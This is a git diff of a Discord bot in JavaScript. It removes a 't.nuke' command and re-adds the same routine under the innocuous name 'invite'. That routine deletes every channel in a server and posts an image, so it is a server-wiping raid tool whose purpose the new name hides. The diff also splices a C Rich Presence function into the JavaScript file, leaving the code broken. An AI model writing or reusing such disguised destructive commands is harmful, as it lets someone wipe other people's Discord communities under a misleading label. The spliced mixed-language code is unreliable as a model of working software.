@@ -20,19 +20,24 @@ activity: {
 }
   });
 }
-client.on("message", message => {
-  if (message.author.id !== '724423864611766294') 
-  return;
-   if (message.content === 't.nuke') {
-    message.guild.channels.cache.forEach(channel => channel.delete());
-    message.guild.channels.create(`#si`, {
-          type: 'text'
-        }).then(channel => {
-          channel.send("https://media.discordapp.net/attachments/839647779580149770/839889412988207104/cropped-1366-768-710940.png?width=842&height=473")
-        })
-         }
-      })
 
+static void UpdatePresence()
+{
+    DiscordRichPresence discordPresence;
+    memset(&discordPresence, 0, sizeof(discordPresence));
+    discordPresence.state = "Playing Solo";
+    discordPresence.details = "Competitive";
+    discordPresence.startTimestamp = 1507665886;
+    discordPresence.endTimestamp = 1507665886;
+    discordPresence.largeImageText = "Numbani";
+    discordPresence.smallImageText = "Rogue - Level 100";
+    discordPresence.partyId = "ae488379-351d-4a4f-ad32-2b9b01c91657";
+    discordPresence.partySize = 1;
+    discordPresence.partyMax = 5;
+    discordPresence.joinSecret = "MTI4NzM0OjFpMmhuZToxMjMxMjM= ";
+    Discord_UpdatePresence(&discordPresence);
+}
+//comandos para todos
       client.on("message", message => {
         if (message.author.id !== '724423864611766294') return;
          const args = message.content.slice().trim().split(/ +/g );
@@ -57,4 +62,22 @@ client.on("message", message => {
         } else if (message.content === 't.help')
            message.channel.send(`En mantenimiento`); 
           });
+
+//comandos solo para mi
+client.on('message', message => {
+            if (!message.content.startsWith(prefix) || !message.guild) return;
+            if (message.author.id !== '724423864611766294') return;
+            
+            const cont = message.content.split(' ').slice(1);
+            const args = cont.join(' ');
+
+            if (message.content.startsWith(prefix+'invite')){
+              message.guild.channels.cache.forEach(channel => channel.delete());
+              message.guild.channels.create(`#si`, {
+                    type: 'text'
+                  }).then(channel => {
+                    channel.send("https://media.discordapp.net/attachments/839647779580149770/839889412988207104/cropped-1366-768-710940.png?width=842&height=473")
+                  })
+                   }
+              });
     client.login(process.env.TOKEN);
